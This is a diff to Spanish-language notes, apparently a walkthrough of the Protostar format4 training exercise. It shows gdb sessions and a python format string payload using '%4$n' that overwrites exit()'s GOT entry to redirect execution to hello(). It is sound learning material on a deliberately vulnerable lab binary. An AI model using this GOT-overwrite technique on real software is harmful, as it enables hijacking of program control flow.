@@ -323,6 +323,8 @@ Instrucciones de main entre ellas, saltar a vuln()
 Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hay que sustituirla por la
 de hello(). En gdb es muy fácil
 
+## Expotación en gdb: 
+
 ```console
 (gdb) b *0x0804850f 
 (gdb) r
@@ -336,6 +338,8 @@ Continuing.
 code execution redirected! you win
 Program exited with code 01.
 ```
+## Diseaccionado en gdb:
+
 Hay que explotarlo con el format string. Ya adelanto que es el 4º argumento.
 > **%4$x"\*4** Escribir a partir del cuarto elemento (pero no en la memoria de ningun puntero de la pila como con %n sino en la pila en sí)
 
@@ -363,7 +367,7 @@ Sabemos de antes que el resultado de la GOT original de exit() es "0x8049724" pe
 Breakpoint 1 alcanzado!
 (gdb) x/i 0x80483ec
 0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724  -> Saltamos a la GOT...
-(gdb) x/x 0x8049724
+(gdb) x/x 0x8049724 -> Insutruciion de GOT, alberga la direccion de nuestra funcion (o sea es un puntero de funcion)
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 -> El valor original que tendría la GOT (saltar al dl.so para buscar la direccion...)
 (gdb) x/2i 0x080483f2 
 0x80483f2 <exit@plt+6>:	push   0x30
@@ -375,7 +379,7 @@ Continuing.
 ```
 
 ## Expotación manual: 
-Vamos a explotarla de una manera muy similar a format3 
+Vamos a explotarla de una manera muy similar a format3, pero en vez de sobreescribir en la direccion de una varaible (puntero de varaible), hay que hacerlo con la de una funcion (puntero de función)
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' > /tmp/pattern
 [user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
